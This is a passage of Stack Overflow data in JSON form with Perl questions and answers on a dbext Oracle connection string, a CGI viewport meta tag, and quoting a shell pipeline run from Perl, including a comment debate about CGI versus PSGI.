connection:</p>\n\n<pre><code>let g:dbext_default_profile_myConnection= 'type=ORA:srvname=//myIP.IP.IP.IP\\:myPORT/mySID:user=myUSER:passwd=myPASSWORD'\n</code></pre>\n\n<p>With DBI perl module It must be something like this:</p>\n\n<pre><code>let g:dbext_default_profile_myDBIConnection = 'type=DBI:user=myUSER:passwd=myPASSWORD:driver=Oracle:conn_parms=host=myHost;port=myPort'\n</code></pre>\n\n<p>But i dont know how to include the <em>SID</em></p>\n\n<p>Can anybody help me? Many thanks!! </p>\n"}, {"tags": ["perl", "cgi"], "answers": [{"comments": [{"owner": {"reputation": 81, "user_id": 6021836, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/84ca3c782ded4d8fd39a6bc0c5024688?s=128&d=identicon&r=PG&f=1", "display_name": "Tony92", "link": "https://stackoverflow.com/users/6021836/tony92"}, "edited": false, "score": 0, "creation_date": 1532965937, "post_id": 51568873, "comment_id": 90161572, "body": "Your answer has been of great use to me !"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 81, "user_id": 6021836, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/84ca3c782ded4d8fd39a6bc0c5024688?s=128&d=identicon&r=PG&f=1", "display_name": "Tony92", "link": "https://stackoverflow.com/users/6021836/tony92"}, "edited": false, "score": 1, "creation_date": 1532974538, "post_id": 51568873, "comment_id": 90166093, "body": "@Tony92: Please read <a href=\"https://stackoverflow.com/help/someone-answers\">What should I do when someone answers my question?</a>"}, {"owner": {"reputation": 342, "user_id": 2038089, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b63f7e356acc7018e0c5c57bbf632532?s=128&d=identicon&r=PG", "display_name": "Ahmad Bilal", "link": "https://stackoverflow.com/users/2038089/ahmad-bilal"}, "edited": false, "score": 0, "creation_date": 1532974612, "post_id": 51568873, "comment_id": 90166127, "body": "I will upvote this, because you have a soft approach in telling people to not use CGI. Some other people (not talking about Dave), just come out very aggressively in suggesting not to use CGI. Sure, it has its weak points, but it is there in one of the big name softwares (Apache httpd) for some reason. And is used in other places as well like embedding. In my humble opinion, I think it is good for getting started, before graduating to FastCGI/PSGI, etc."}, {"owner": {"reputation": 793701, "user_id": 19068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d2d3229ed1961d2bd81853242493247?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/19068/quentin"}, "reply_to_user": {"reputation": 342, "user_id": 2038089, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b63f7e356acc7018e0c5c57bbf632532?s=128&d=identicon&r=PG", "display_name": "Ahmad Bilal", "link": "https://stackoverflow.com/users/2038089/ahmad-bilal"}, "edited": false, "score": 1, "creation_date": 1533024539, "post_id": 51568873, "comment_id": 90181815, "body": "@AhmadBilal \u2014 CGI.pm is still terrible. If you want to use CGI then you should use something like CGI::PSGI so that you can write code which will work when you move to a different protocol."}], "tags": [], "owner": {"reputation": 793701, "user_id": 19068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d2d3229ed1961d2bd81853242493247?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/19068/quentin"}, "is_accepted": false, "score": 7, "last_activity_date": 1532760733, "creation_date": 1532760733, "answer_id": 51568873, "question_id": 51568792, "link": "https://stackoverflow.com/questions/51568792/perl-cgi-meta-tag-viewport/51568873#51568873", "title": "Perl CGI meta tag viewport", "body": "<p>Don't confuse the HTTP header with the HTML <code>&lt;head&gt;</code> section.</p>\n\n<p>If you were going to use the CGI module's HTML generating methods, then you would do this in the same way as your <code>copyleft</code> meta element.</p>\n\n<pre><code>-meta =&gt; {\n    copyleft =&gt; 'xxxxx@yahoo.fr', \n    viewport =&gt; 'width=device-width,initial-scale=1,user-scalable=yes'\n},\n</code></pre>\n\n<p>However <strong>HTML Generation functions should no longer be used</strong> (as per <a href=\"https://metacpan.org/pod/distribution/CGI/lib/CGI.pod#HTML-Generation-functions-should-no-longer-be-used\" rel=\"noreferrer\">the CGI.pm documentation</a>). </p>\n\n<p>You could replace this code with <a href=\"https://metacpan.org/pod/CGI::Alternatives#CGI.pm-Using-Template-Toolkit\" rel=\"noreferrer\">a template system</a>.</p>\n\n<p>For that matter, you should <a href=\"https://metacpan.org/pod/distribution/CGI/lib/CGI.pod#CGI.pm-HAS-BEEN-REMOVED-FROM-THE-PERL-CORE\" rel=\"noreferrer\">avoid CGI entirely</a> and use an <a href=\"https://metacpan.org/pod/CGI::Alternatives#CGI.pm-Using-Template-Toolkit\" rel=\"noreferrer\">alternative</a> such as <a href=\"https://plackperl.org/\" rel=\"noreferrer\">PSGI</a>.</p>\n"}, {"comments": [{"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 4, "creation_date": 1532795275, "post_id": 51572791, "comment_id": 90112267, "body": "He already has a good answer explaining how to do it using CGI.pm (which is what he wanted). Why add another answer making the (frankly, terrible) suggestion to put raw HTML into the Perl program? We&#39;ve know what a bad idea that is for decades :-)"}, {"owner": {"reputation": 342, "user_id": 2038089, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b63f7e356acc7018e0c5c57bbf632532?s=128&d=identicon&r=PG", "display_name": "Ahmad Bilal", "link": "https://stackoverflow.com/users/2038089/ahmad-bilal"}, "reply_to_user": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1532895898, "post_id": 51572791, "comment_id": 90133900, "body": "Please do explain, how is that way of putting HTML .. a &#39;bad idea&#39; (or link to it). I don&#39;t think, he wanted what Quentin provided."}, {"owner": {"reputation": 342, "user_id": 2038089, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b63f7e356acc7018e0c5c57bbf632532?s=128&d=identicon&r=PG", "display_name": "Ahmad Bilal", "link": "https://stackoverflow.com/users/2038089/ahmad-bilal"}, "reply_to_user": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1532896096, "post_id": 51572791, "comment_id": 90133956, "body": "Besides, I think Quentin added to/modified his answer later on"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1532896746, "post_id": 51572791, "comment_id": 90134117, "body": "To answer your points in reverse order. Firstly, you can see when an answer has been edited. Quentin&#39;s answer hasn&#39;t been edited since it was first posted. Secondly, I don&#39;t see why he wouldn&#39;t want what Quentin posted. He&#39;s clearly writing code using CGI.pm (and using the HTML generation functions). He wanted to add a &quot;meta viewport&quot; tag. Quentin&#39;s answer demonstrates how to do that using the HTML generation functions that he is already using."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 4, "creation_date": 1532896960, "post_id": 51572791, "comment_id": 90134188, "body": "And as for why it&#39;s a bad idea to put HTML into Perl code - well, I think it&#39;s pretty obvious if you think about it. HTML and Perl are completely different things. In many projects they will be edited by completely different people. It&#39;s bizarre to expect HTML experts to edit Perl code in order to change the look and feel of a page (and even if the same person was editing the Perl and the HTML, it still makes sense to separate them into different files to make it easier). These days HTML files can get very complicated and combining HTML with your Perl code is madness. Use a templating system."}, {"owner": {"reputation": 342, "user_id": 2038089, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b63f7e356acc7018e0c5c57bbf632532?s=128&d=identicon&r=PG", "display_name": "Ahmad Bilal", "link": "https://stackoverflow.com/users/2038089/ahmad-bilal"}, "reply_to_user": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1532973067, "post_id": 51572791, "comment_id": 90165318, "body": "It appeared to me, he might have needed what I provided. What appeared to you is your opinion. You could have just upvoted Quentin&#39;s answer and left it at that. No need to tell me not to add a answer. Why do I feel aggressive vibes coming from you?"}, {"owner": {"reputation": 342, "user_id": 2038089, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b63f7e356acc7018e0c5c57bbf632532?s=128&d=identicon&r=PG", "display_name": "Ahmad Bilal", "link": "https://stackoverflow.com/users/2038089/ahmad-bilal"}, "reply_to_user": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1532973691, "post_id": 51572791, "comment_id": 90165650, "body": "Sometimes, people come here.. just trying to complete a class assignment, or are beginning to code in perl/cgi, so they can do with more elementary methods. Yes CGI is old and has its drawbacks (which I remarked upon) , but they might not be looking for template system every time."}, {"owner": {"reputation": 342, "user_id": 2038089, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b63f7e356acc7018e0c5c57bbf632532?s=128&d=identicon&r=PG", "display_name": "Ahmad Bilal", "link": "https://stackoverflow.com/users/2038089/ahmad-bilal"}, "reply_to_user": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1532974045, "post_id": 51572791, "comment_id": 90165833, "body": "Ever thought that .. what appears &quot;bizarre&quot;, &quot;obvious&quot; and &quot;madness&quot; to you, might not be so in every situation for everyone out there!? Anyways, the guy got his answer (although he has not yet ticked the &#39;chosen answer&#39;), so you should let it cool man."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 3, "creation_date": 1532974303, "post_id": 51572791, "comment_id": 90165975, "body": "I should let it cool? :-) Other than my first comment (and, now, this one) I&#39;ve just been answering your questions. And to be clear: CGI programming is <b>always</b> the wrong approach (CGI deployment might be the right approach, but that&#39;s a different issue) and using a templating system is <b>always</b> better than putting raw HTML in Perl code."}, {"owner": {"reputation": 342, "user_id": 2038089, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b63f7e356acc7018e0c5c57bbf632532?s=128&d=identicon&r=PG", "display_name": "Ahmad Bilal", "link": "https://stackoverflow.com/users/2038089/ahmad-bilal"}, "reply_to_user": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1532975033, "post_id": 51572791, "comment_id": 90166327, "body": "Well, I did say.. I got a vibe only (looking at the wordings). I&#39;m happy to know, that its all cool.  As for CGI, that is your opinion, and might be the major opinion. But you never know, when someone would come out with some big improvement similar to FastCGI (not taking the other approaches like PSGI/mojo/dancer)."}, {"owner": {"reputation": 342, "user_id": 2038089, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b63f7e356acc7018e0c5c57bbf632532?s=128&d=identicon&r=PG", "display_name": "Ahmad Bilal", "link": "https://stackoverflow.com/users/2038089/ahmad-bilal"}, "reply_to_user": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1532975394, "post_id": 51572791, "comment_id": 90166497, "body": "And yes, thank you for the part where you answered my questions."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 2, "creation_date": 1532976617, "post_id": 51572791, "comment_id": 90167065, "body": "See, here&#39;s the thing about PSGI. It does <b>everything</b> that CGI does. But it is more powerful and more flexible. Write a program and deploy it as a CGI program? Sure PSGI can do that. Move that program to FCGI or <code>mod_perl</code>? Yep, you can do that without changing a line of code. Take the same code and make it a separate daemon running behind a proxy? Of course. And all the time, you do have access to better debugging and testing tools than plain CGI gives you. I can&#39;t think of a single circumstance where I would rather use CGI than PSGI. I should blog about this in detail at some point."}], "tags": [], "owner": {"reputation": 342, "user_id": 2038089, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/b63f7e356acc7018e0c5c57bbf632532?s=128&d=identicon&r=PG", "display_name": "Ahmad Bilal", "link": "https://stackoverflow.com/users/2038089/ahmad-bilal"}, "is_accepted": false, "score": -2, "last_activity_date": 1532791946, "creation_date": 1532791946, "answer_id": 51572791, "question_id": 51568792, "link": "https://stackoverflow.com/questions/51568792/perl-cgi-meta-tag-viewport/51572791#51572791", "title": "Perl CGI meta tag viewport", "body": "<p>You can do this (and you need no additional module than your CGI one)</p>\n\n<pre><code>print \"Content-type:text/html\\n\\n\";\nprint qq(\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;title&gt;Yourwebsite.com&lt;/title&gt;\n&lt;meta charset=\"UTF-8\"&gt;\n&lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;more html code here .....&gt;\n&lt;/body&gt;\n&lt;/html&gt; );\n</code></pre>\n\n<p>If you are just beginning with perl/programming, I do not discourage you from using CGI (like others usually do) but I would request you to know its limitation properly, and use/not-use it accordingly. </p>\n"}], "owner": {"reputation": 81, "user_id": 6021836, "user_type": "registered", "accept_rate": 0, "profile_image": "https://www.gravatar.com/avatar/84ca3c782ded4d8fd39a6bc0c5024688?s=128&d=identicon&r=PG&f=1", "display_name": "Tony92", "link": "https://stackoverflow.com/users/6021836/tony92"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 190, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1532791946, "creation_date": 1532760163, "last_edit_date": 1532764119, "question_id": 51568792, "link": "https://stackoverflow.com/questions/51568792/perl-cgi-meta-tag-viewport", "title": "Perl CGI meta tag viewport", "body": "<p>I'm using Perl CGI and I'm looking for how to include in the header, the viewport meta, ie the following html line:</p>\n\n<pre><code>&lt;meta name = \"viewport\"\n     content = \"width = device-width, initial-scale = 1, user-scalable = yes\"&gt;\n</code></pre>\n\n<p>The header of my script is as follows:</p>\n\n<pre><code>use strict;\nuse warnings;\nuse utf8;\nuse DBI;\nuse CGI qw (-any);\nuse Switch;\nmy $ cgi = new CGI;\n\nprint $ cgi-&gt; header (\"text/html; charset=UTF-8\");\nprint $ cgi-&gt; start_html (\n  -title =&gt; 'List of new movies',\n  -author =&gt; 'xxxxx@yahoo.fr',\n  -lang =&gt; 'en',\n  -meta =&gt; {copyleft =&gt; 'xxxxx@yahoo.fr'},\n  -style =&gt; {-src =&gt; 'https://my-web-server.com/style.css'},\n\n);\n</code></pre>\n"}, {"tags": ["regex", "bash", "perl", "sed"], "comments": [{"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 5, "creation_date": 1532746774, "post_id": 51567589, "comment_id": 90101712, "body": "That is very surprising that perl <code>needs to call BASH scripts to search, sort and insert a path in the front of each line</code>. You&#39;d think such a huge language with all those libraries would be able to do the job itself without calling a bunch of external tools to do it. Assuming you&#39;re right though, why not get your script working outside of perl and THEN try to include it in the perl script once you&#39;ve worked out the kinks like this one. There are hundreds of scripts in this forum (posted almost daily!) that will show you how to address that specific problem."}, {"owner": {"reputation": 367, "user_id": 6288248, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/owuR9.png?s=128&g=1", "display_name": "Leon", "link": "https://stackoverflow.com/users/6288248/leon"}, "reply_to_user": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 0, "creation_date": 1532749750, "post_id": 51567589, "comment_id": 90102038, "body": "Honestly, I just use PERL for a short while. Any suggestion?"}, {"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 0, "creation_date": 1532749854, "post_id": 51567589, "comment_id": 90102045, "body": "Did you try the suggestions in my first comment? If so, what were the results of searching the forum and trying to get it working outside of perl?"}, {"owner": {"reputation": 367, "user_id": 6288248, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/owuR9.png?s=128&g=1", "display_name": "Leon", "link": "https://stackoverflow.com/users/6288248/leon"}, "reply_to_user": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 0, "creation_date": 1532750624, "post_id": 51567589, "comment_id": 90102124, "body": "Yes. I did it. I cannot avoid inserting &quot;\\&quot; in the front of &quot;/&quot;. I do not know whether I have an easier way."}, {"owner": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 0, "creation_date": 1532751958, "post_id": 51567589, "comment_id": 90102324, "body": "Yes you can avoid it, just use a different delimiter. Honestly there&#39;s been multiple sed questions this week alone about this. Just look for sed questions that mention delimiters or look at the sed man page."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 155597, "user_id": 1745001, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/99a3ebae89496eb16afe453aae97f5be?s=128&d=identicon&r=PG", "display_name": "Ed Morton", "link": "https://stackoverflow.com/users/1745001/ed-morton"}, "edited": false, "score": 0, "creation_date": 1532755874, "post_id": 51567589, "comment_id": 90102977, "body": "@Ed Morton, Switching delimiters just shifts the problem instead of fixing it. Using <code>\\Q$dir\\E</code> is the real fix."}], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": -1, "last_activity_date": 1532756023, "last_edit_date": 1532756023, "creation_date": 1532755673, "answer_id": 51568355, "question_id": 51567589, "link": "https://stackoverflow.com/questions/51567589/command-pipeline-run-out-of-perl-fails-at-sed-prepending-a-path/51568355#51568355", "title": "Command pipeline run out of Perl fails at sed prepending a path", "body": "<p>You are improperly generating the <code>sed</code> program (as seen by printing <code>\"sed 's/^/$dir /'\"</code>).</p>\n\n<p>You are also improperly generating the shell command.</p>\n\n<p>Fixed:</p>\n\n<pre><code>use String::ShellQuote qw( shell_quote );\n\nmy $cmd = join(' | ',\n   shell_quote('grep', '--', $pattern1, $file),\n   shell_quote('grep', '--', $pattern2),\n   'sort -uk 5,6',\n   'sort -k 2',\n   shell_quote('sed', \"s/^/\\Q$dir\\E /\"),\n);\n\nsystem($cmd);\n</code></pre>\n\n<p>Note that I replaced <code>$a</code> and <code>$b</code> with <code>$pattern1</code> and <code>$pattern2</code>. <code>$a</code> and <code>$b</code> are special variables, and <code>$a and</code>$b` are meaningless names.</p>\n"}, {"comments": [{"owner": {"reputation": 367, "user_id": 6288248, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/owuR9.png?s=128&g=1", "display_name": "Leon", "link": "https://stackoverflow.com/users/6288248/leon"}, "edited": false, "score": 0, "creation_date": 1532899727, "post_id": 51568663, "comment_id": 90134923, "body": "Thank you so much for your help. I am writing a scripts which scan my research data. The column number of my data is various. Furthermore, my data is more than 1 million records. I do not know your way is more efficient than BASH scripts. Any further suggestion and help would be highly appreciated."}], "tags": [], "owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "is_accepted": false, "score": 4, "last_activity_date": 1532758881, "creation_date": 1532758881, "answer_id": 51568663, "question_id": 51567589, "link": "https://stackoverflow.com/questions/51567589/command-pipeline-run-out-of-perl-fails-at-sed-prepending-a-path/51568663#51568663", "title": "Command pipeline run out of Perl fails at sed prepending a path", "body": "<p>You can also do all the operations in Perl (without calling system commands <code>sort</code>, <code>grep</code>, and <code>sed</code>):</p>\n\n<p>First read the file line by line and construct the sorting keys for each line:</p>\n\n<pre><code>while ( my $line = &lt;$fh&gt; ) {\n    chomp $line;\n    # IMPORTANT: $a and $b are special names in Perl, so avoid these.\n    #   I used here $aa and $bb...\n    if ($line =~ /\\Q$aa\\E/ &amp;&amp; $line =~ /\\Q$bb\\E/) { # grep $a $file | grep $b\n        my @fields = split \" \", $line;\n        my $key1 = join \"\", @fields[4..5];\n        my $key2 = $fields[1];\n        push @lines, [$key1, $key2, $line];\n    }\n}\n</code></pre>\n\n<p>Now, as you have the <code>@lines</code> array, you can simply do:</p>\n\n<pre><code>my %seen;\nsay for map { \"$dir \" . $_-&gt;[2] }\n  sort { $a-&gt;[1] cmp $b-&gt;[1] } \n  grep { !$seen{ $_-&gt;[2] }++ }\n  sort { $a-&gt;[0] cmp $b-&gt;[0] } @lines;\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 367, "user_id": 6288248, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/owuR9.png?s=128&g=1", "display_name": "Leon", "link": "https://stackoverflow.com/users/6288248/leon"}, "edited": false, "score": 0, "creation_date": 1532899618, "post_id": 51568678, "comment_id": 90134912, "body": "Thank you so much for your help. I am writing a scripts which scan my research data. The column number of my data is various. Furthermore, my data is more than 1 million records.  I do not know your way is more efficient than BASH scripts. Any further suggestion and help would be highly appreciated."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 367, "user_id": 6288248, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/owuR9.png?s=128&g=1", "display_name": "Leon", "link": "https://stackoverflow.com/users/6288248/leon"}, "edited": false, "score": 1, "creation_date": 1532929479, "post_id": 51568678, "comment_id": 90140367, "body": "@Leon  Very glad to help. With files of that size this should still work.  The efficiency of most code can always be improved, but is it needed? Does this run too slow or does it take too much memory?  Test, and let me know if there is a problem.  I don&#39;t know what bash script you have in mind and how it compares to that."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 2, "last_activity_date": 1532801654, "last_edit_date": 1532801654, "creation_date": 1532758969, "answer_id": 51568678, "question_id": 51567589, "link": "https://stackoverflow.com/questions/51567589/command-pipeline-run-out-of-perl-fails-at-sed-prepending-a-path/51568678#51568678", "title": "Command pipeline run out of Perl fails at sed prepending a path", "body": "<p>Since this runs out of a Perl script there is no good reason to go for external tools for any of the processing.  Perl has varied support for this kind of work and excels at it.</p>\n\n<pre><code>use warnings;\nuse strict;\nuse feature 'say';\n\nuse List::Util qw(uniq);\n\nmy $file = shift @ARGV;\ndie \"Usage: $0 filename\\n\" if not $file or not -f $file;\n\nopen my $fh, '&lt;', $file or die \"Can't open $file: $!\";\n\nmy $patt1 = qr/./;  # match any one character; for testing\nmy $patt2 = qr/./;  # these are \"$a\" and \"$b\"\n\n# Only lines with both patterns\nmy @lines = grep { /$patt1/ and /$patt2/ } &lt;$fh&gt;;\n\nmy $dir = '/some/path/';\nmy %freq;\n\nmy @sorted =\n    map { \"$dir \" . join ' ', @$_ }\n    grep { ++$freq{join(\"\", @{$_}[4,5])} == 1 } \n    sort { \n        $a-&gt;[1] cmp $b-&gt;[1] or\n        $a-&gt;[4] cmp $b-&gt;[4] or\n        $a-&gt;[5] cmp $b-&gt;[5]\n    }   \n    map { [ split ] } \n    @lines;\n\nsay for @sorted;\n</code></pre>\n\n<p>I use <code>$patt1</code> and <code>$patt2</code> instead of <code>$a</code> and <code>$b</code>, which are special names that shouldn't be used (and are very bad variable names).  I set them to match any one character, for my tests.</p>\n\n<p>In the sorting statement, an arrayref is first made of words for each line (fields for external <code>sort</code>). Then these arrayrefs are sorted by the second field and then by 5th and 6th. The sorted set is then filtered so to keep only the first line from each subset of lines with equal 5th and 6th field (unique in these sorted fields, <code>-uk 5,6</code> in external<code>sort</code>). </p>\n\n<p>Finally the lines are reconstituted as strings and prepended a <code>$dir</code>.</p>\n\n<p>This has been tested with a file I made up but as I am not certain what exactly your pipeline is meant to do it may need changes to match that purpose. </p>\n\n<p>The script takes all lines from a file and retains all those which have patterns.  The memory usage is then multiple times that, due to the <code>sort</code> statement, and for files of extreme size this may be too much. \nIn such a case we'd have an example when an external tool is helpful, since system <code>sort</code> does not load whole files in memory when they are too large.</p>\n"}], "owner": {"reputation": 367, "user_id": 6288248, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/owuR9.png?s=128&g=1", "display_name": "Leon", "link": "https://stackoverflow.com/users/6288248/leon"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 90, "favorite_count": 0, "accepted_answer_id": 51568678, "answer_count": 3, "score": 0, "last_activity_date": 1532974894, "creation_date": 1532745895, "last_edit_date": 1532974894, "question_id": 51567589, "link": "https://stackoverflow.com/questions/51567589/command-pipeline-run-out-of-perl-fails-at-sed-prepending-a-path", "title": "Command pipeline run out of Perl fails at sed prepending a path", "body": "<p>I am writing a Perl program which needs to call bash scripts to search, sort, and insert a path in the front of each line. Below is my script.</p>\n\n<pre><code>...\nsystem(\"grep $a $file | grep $b | sort -uk 5,6 | sort -k 2 | sed 's/^/$dir /'\");\n...\n</code></pre>\n\n<p>where <code>$a</code>, <code>$b</code>, <code>$file</code>, and <code>$dir</code> are variables. Among them, </p>\n\n<pre><code>$dir = \"/home/user/simulations/dir1/dir2/dir3/.../dirn/$file\"\n</code></pre>\n\n<p>If I use a string without <code>/</code>, I can run this script without any problems. However, if I use a variable <code>$dir</code> in which the value consists of <code>/</code>, I always get the error message:</p>\n\n<pre>\nsed: -e expression #1, char 6: unknown option to `s'\n</pre>\n\n<p>Because the length/scale of each directory is different, is there an easy way to avoid inserting <code>\\</code>? Any suggestion and help would be highly appreciated.</p>\n"}, {"tags": ["perl"], "answers": [{"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": true, "score": 4, "last_activity_date": 1532716001, "creation_date": 1532716001, "answer_id": 51563591, 